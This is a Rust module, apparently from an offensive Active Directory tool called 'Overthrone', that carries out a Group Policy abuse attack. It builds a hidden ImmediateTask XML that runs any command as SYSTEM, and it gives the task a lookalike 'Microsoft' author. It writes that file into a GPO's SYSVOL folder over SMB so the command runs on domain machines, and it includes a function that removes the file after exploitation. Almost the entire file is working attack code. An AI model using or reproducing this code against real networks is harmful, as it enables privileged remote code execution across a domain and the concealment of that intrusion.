//! GPO abuse: write ImmediateTask XML to SYSVOL to trigger code execution.
//!
//! Flow (least-privilege):
//!   1. Enumerate GPOs via LDAP (`ldap::LdapSession::enumerate_gpos`)
//!   2. Build the ScheduledTasks XML blob with `build_immediate_task_xml`
//!   3. Write it to the SYSVOL share with `write_gpo_task` (needs WriteDacl/Write on SYSVOL)
//!   4. (Optional) bump the GPO version number to force immediate application
//!   5. After payload fires, call `cleanup_gpo_task` to remove the XML

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use chrono::Utc;
use uuid::Uuid;

// ── XML builder ──────────────────────────────────────────────────────────────

/// Build a Windows ImmediateTask XML blob that runs `command` **once** right
/// after the next GP refresh cycle (no logon required — machine policy).
///
/// `task_name` — display name shown in Task Scheduler (e.g. `"Overthrone-<timestamp>"`)  
/// `command`   — full command line, e.g. `r"cmd.exe /c whoami > C:\out.txt"`
///
/// The resulting XML should be written to:
/// `SYSVOL\{domain}\Policies\{gpo-cn}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
pub fn build_immediate_task_xml(task_name: &str, command: &str) -> String {
    let (prog, args) = split_command(command);
    let uid = Uuid::new_v4().to_string().to_uppercase();
    let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();

    // Escape special XML characters in user-supplied strings
    let task_name_xml = xml_escape(task_name);
    let prog_xml = xml_escape(&prog);
    let args_xml = xml_escape(&args);
    let uid_xml = xml_escape(&uid);
    let now_xml = xml_escape(&now);

    format!(
        r#"<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{{CC63F200-7309-4ba0-B154-A0CE23244B27}}">
  <ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"
    name="{task_name_xml}"
    image="0"
    changed="{now_xml}"
    uid="{{{uid_xml}}}"
    userContext="0"
    removePolicy="0">
    <Properties
      action="C"
      name="{task_name_xml}"
      runAs="NT AUTHORITY\System"
      logonType="S4U">
      <Task version="1.3">
        <RegistrationInfo>
          <Author>Microsoft\Overtone</Author>
          <Description>Scheduled Task</Description>
        </RegistrationInfo>
        <Principals>
          <Principal id="Author">
            <UserId>NT AUTHORITY\System</UserId>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Settings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
          <AllowHardTerminate>true</AllowHardTerminate>
          <StartWhenAvailable>true</StartWhenAvailable>
          <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
          <IdleSettings>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
          </IdleSettings>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <Enabled>true</Enabled>
          <Hidden>true</Hidden>
          <RunOnlyIfIdle>false</RunOnlyIfIdle>
          <WakeToRun>false</WakeToRun>
          <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
          <Priority>7</Priority>
          <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
        </Settings>
        <Triggers>
          <TimeTrigger>
            <StartBoundary>{now_xml}</StartBoundary>
            <Enabled>true</Enabled>
          </TimeTrigger>
        </Triggers>
        <Actions Context="Author">
          <Exec>
            <Command>{prog_xml}</Command>
            <Arguments>{args_xml}</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
"#,
        task_name_xml = task_name_xml,
        now_xml = now_xml,
        uid_xml = uid_xml,
        prog_xml = prog_xml,
        args_xml = args_xml,
    )
}

// ── SYSVOL helpers ───────────────────────────────────────────────────────────

/// Write an ImmediateTask XML file to SYSVOL and return the written path.
///
/// `smb`          — authenticated `SmbSession` connected to the DC  
/// `domain_fqdn`  — e.g. `"sevenkingdoms.local"`  
/// `gpo_cn`       — raw CN from `GpoInfo::cn`, e.g. `"{31B2F340-016D-11D2-945F-00C04FB984F9}"`  
/// `xml`          — output of `build_immediate_task_xml`  
/// `is_machine`   — `true` → Machine policy, `false` → User policy
pub async fn write_gpo_task(
    smb: &SmbSession,
    domain_fqdn: &str,
    gpo_cn: &str,
    xml: &str,
    is_machine: bool,
) -> Result<String> {
    let share = "SYSVOL";
    let policy_dir = if is_machine { "Machine" } else { "User" };
    // SYSVOL path relative to the share root:
    // <domain_fqdn>\Policies\<gpo_cn>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
    let rel_path = format!(
        "{domain}\\Policies\\{gpo_cn}\\{policy_dir}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        domain = domain_fqdn,
        gpo_cn = gpo_cn,
        policy_dir = policy_dir,
    );

    smb.write_file(share, &rel_path, xml.as_bytes())
        .await
        .map_err(|e| OverthroneError::Smb(format!("GPO write failed: {e}")))?;

    Ok(rel_path)
}

/// Remove the ImmediateTask XML to clean up post-exploitation.
pub async fn cleanup_gpo_task(
    smb: &SmbSession,
    domain_fqdn: &str,
    gpo_cn: &str,
    is_machine: bool,
) -> Result<()> {
    let share = "SYSVOL";
    let policy_dir = if is_machine { "Machine" } else { "User" };
    let rel_path = format!(
        "{domain}\\Policies\\{gpo_cn}\\{policy_dir}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        domain = domain_fqdn,
        gpo_cn = gpo_cn,
        policy_dir = policy_dir,
    );

    smb.delete_file(share, &rel_path)
        .await
        .map_err(|e| OverthroneError::Smb(format!("GPO cleanup failed: {e}")))?;

    Ok(())
}

// ── Private utilities ────────────────────────────────────────────────────────

/// Split `"cmd.exe /c whoami"` → `("cmd.exe", "/c whoami")`.
/// If the first token is quoted (e.g. `r#""C:\foo bar\x.exe" /arg"#`),
/// the quoted portion becomes the program, the rest are args.
fn split_command(command: &str) -> (String, String) {
    let s = command.trim();
    if s.starts_with('"') {
        if let Some(end) = s[1..].find('"') {
            let prog = s[1..=end].to_string();
            let args = s[end + 2..].trim().to_string();
            return (prog, args);
        }
    }
    if let Some(sp) = s.find(' ') {
        (s[..sp].to_string(), s[sp + 1..].to_string())
    } else {
        (s.to_string(), String::new())
    }
}

/// Escape the five XML special characters.
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_split_command_simple() {
        let (p, a) = split_command("cmd.exe /c whoami");
        assert_eq!(p, "cmd.exe");
        assert_eq!(a, "/c whoami");
    }

    #[test]
    fn test_split_command_quoted() {
        let (p, a) = split_command(r#""C:\Windows\cmd.exe" /c whoami"#);
        assert_eq!(p, "C:\\Windows\\cmd.exe");
        assert_eq!(a, "/c whoami");
    }

    #[test]
    fn test_split_command_no_args() {
        let (p, a) = split_command("notepad.exe");
        assert_eq!(p, "notepad.exe");
        assert_eq!(a, "");
    }

    #[test]
    fn test_xml_escape() {
        assert_eq!(xml_escape("a&b<c>d\"e'f"), "a&amp;b&lt;c&gt;d&quot;e&apos;f");
    }

    #[test]
    fn test_build_immediate_task_xml_contains_key_elements() {
        let xml = build_immediate_task_xml("TestTask", "cmd.exe /c whoami");
        assert!(xml.contains("ImmediateTaskV2"));
        assert!(xml.contains("TestTask"));
        assert!(xml.contains("cmd.exe"));
        assert!(xml.contains("/c whoami"));
        assert!(xml.contains("NT AUTHORITY\\System"));
    }
}
